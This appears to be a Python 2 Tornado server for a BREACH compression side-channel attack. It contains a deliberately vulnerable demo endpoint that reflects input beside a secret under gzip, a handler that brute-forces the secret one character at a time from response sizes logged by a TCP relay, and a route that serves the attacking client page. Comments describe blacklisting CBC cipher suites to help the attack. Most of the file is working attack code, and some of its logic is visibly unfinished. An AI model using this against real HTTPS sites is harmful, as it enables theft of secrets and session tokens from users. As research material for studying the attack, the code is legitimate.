from StringIO import StringIO
import gzip
import urllib2
import string
import heapq
import json

#server stuff
import tornado.httpserver
import tornado.ioloop
import tornado.web
import tornado.options
import logging

logging.getLogger().setLevel(logging.INFO)



#DESCRIPTION - in progress
#STATEFUL - File storage
#client gets first token with /next
#client needs to request   /?val=SecretVal=a
#tcprelay write to file ~/responsesize
#client gets new token with /next
#server reads responsesize and sets it to -1 adds it to dictionary of following format [(a,42),(b,43)]
#server responds with next value
#if out of values, server finds minimum and rebuilds dictionary (loops)
#server tracks response lengths and temp dictionary for each request
#Client sends /?val=&tempDictionary=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_
#Server responds a,



#rfc 2246 to blacklist CBC
#--cipher-suite-blacklist=0x000B,0x000C,0x000D,0x0011,0x0012,0x0013

#todo
#run through deployment
#get working in more expansive HTML
#get CBC working
#get target URL from server

#sample web application to hack
class MainHandler(tornado.web.RequestHandler):

	def get(self):

		self.write("SecretVal=" + "crimepays" + self.get_argument("val", default=""))
		#self.write("<html><input type='hidden' name=hiddentoken value='SecretVal=crimepays'><input type='text' name=search value='" + self.get_argument("val", default="") +"'></html>")

	def set_default_headers(self):
		self.set_header("Access-Control-Allow-Origin", "*")
		self.set_header("Cache-Control", "No-Cache")
		self.set_header("Expires", "Thu, 31 Jan 2010 14:51:51 GMT")

	def compute_etag(self):
		return None


class LoginHandler(tornado.web.RequestHandler):
	def get(self):
		self.set_cookie("Auth", "CrimePays")


#provides client with next values
class NextHandler(tornado.web.RequestHandler):

	dictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
	#dictionary = "abcdefg"
	tempdictionary = []
	prefix = ""
	alltimemin = -1
	responses = []

	#read file and get size of last packet
	def getSize(self):
		try:
   			f = open('responsesize', 'r')
   			responseSize = f.readline()
			f.close()
			f = open('responsesize', 'w') #reset size
			f.write("-1")
			f.close()
			return responseSize
		except IOError:
			print "file responsesize does not exist"
			return 500

	#find the shortest response(s)
	def findminimum(self):
		minimum = []
		minimum = [self.responses[0][1]]
		minimumlen = self.responses[0][0]

		for r in self.responses[1:]: #dont redo the first one
			print "S:" + str(r[0])
			if r[0] < minimumlen:
				minimumlen = r[0]
				minimum = [r[1]]
			elif r[0] == minimumlen:
				minimum.append(r[1])

		print "MinLen: " + str(minimumlen)
		return (minimumlen, minimum)


	#build a new dictionary to work off of -- used for when there is a "tie" between chars
	def builddictionary(self, minchars, dictionary):
		newdict = []

		for a in minchars:
			for d in dictionary:
				newdict.append(a + d)

		return newdict


	#returns next value to BF with
	def getNext(self, last):
		self.auto_etag = False

		#try:
		dIndex = self.tempdictionary.index(last)
		if (dIndex < len(self.tempdictionary)-1):
			next = self.tempdictionary[dIndex+1]
		else: #handle end of tempdict

			#find minimum
			minlength, minchars = self.findminimum()

			#if minlength is greater than all found so far, stop, answer found (not always going to happen) 
			if self.alltimemin == -1:
				self.alltimemin = minlength
			elif self.alltimemin < minlength:
				next = "QUIT"

			print "minchars: " + str(minchars)

			if len(minchars) == 1:
				prefix = minchars 
				f = open('responsesdict', 'w+') #creates and clears file
				f.write("")
				f.close()

			#new prefix = solution
			prefix = minchars 

			#rebuild temp dictionary
			self.tempdictionary = self.builddictionary(minchars, self.dictionary)
			print "tempdict: " + str(self.tempdictionary)		
			self.responses = []

			next = self.tempdictionary[0]

		return next
		#except:
		#	print "couldnt get index for: " + last

	#returns next value to BF with
	def get(self):
		self.write(json.dumps( {'next': self.dictionary[0], 'prefix':"", 'tempdictionary':self.dictionary} ) )

	#returns next value to BF with
	def post(self):

		#logging.info('RECEIVED HTTP GET REQUEST')
		self.auto_etag = False

		req = json.loads(self.request.body)

		print "last:" + req['last']
		self.prefix = req['prefix']
		if req['tempdictionary'] != "":
			self.tempdictionary = req['tempdictionary']


		if req['last'] == "" or req['last'] == None:  #first request
			print "Creating Files"
			for a in self.dictionary:
				self.tempdictionary.append(a)

			self.write(json.dumps( {'next': self.dictionary[0], 'prefix':"", 'tempdictionary':self.tempdictionary} ) )
			f = open('responsesdict', 'w+') #creates and clears file
			f.write("")
			f.close()

			f = open('responsesize', 'w') #reset size
			f.write("-1")
			f.close()


		else: #read responses from file and unserialize 
			f = open('responsesdict', 'r+')
			obj = f.readline()
			print "appending to :" + str(self.responses)
			if obj != "":
				print "current:" + obj
				self.responses = json.loads(obj)
			f.close()
		
			#get latest response size and add it to responses dict
			f = open('responsesdict', 'w+')
			previous = self.tempdictionary[self.tempdictionary.index(req['last'])]

			#print "previndex: "+ str(self.tempdictionary.index(req['last']))
			#print "previous: " + previous

			self.responses.append([self.getSize(), previous])
			
			next = self.getNext(req['last'])

			f.write(json.dumps(self.responses))
			f.close()

			#output result & call getnext
			self.write( json.dumps( {'next': next, 'prefix':self.prefix, 'tempdictionary':self.tempdictionary} ) )
			
			#logging.info('Returning: ' + self.getNext(req['last']))

	def set_default_headers(self):
		self.set_header("Access-Control-Allow-Origin", "*")



class BreachSlave(tornado.web.RequestHandler):
	def get(self):
		f = open('BreachSlave.html', 'r+')
		obj = f.read()
		f.close()
		self.write(obj)


application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/next", NextHandler),
    (r"/login", LoginHandler),
    (r'/BreachSlave\.html', BreachSlave)

], debug=True, gzip=True)

if __name__ == "__main__":
	f = open('responsesdict', 'w+') #creates and clears file
	f.write("")
	f.close()
	f = open('responsesize', 'w+') #creates and clears file
	f.write("")
	f.close()


	http_server = tornado.httpserver.HTTPServer(application,
		ssl_options={
		"certfile": "./cert.pem",
		"keyfile": "./key.pem",

	})

	#ssl
	http_server.listen(8888)
	tornado.ioloop.IOLoop.instance().start()

	#non-SSL
	#application.listen(8888)
	#tornado.ioloop.IOLoop.instance().start()

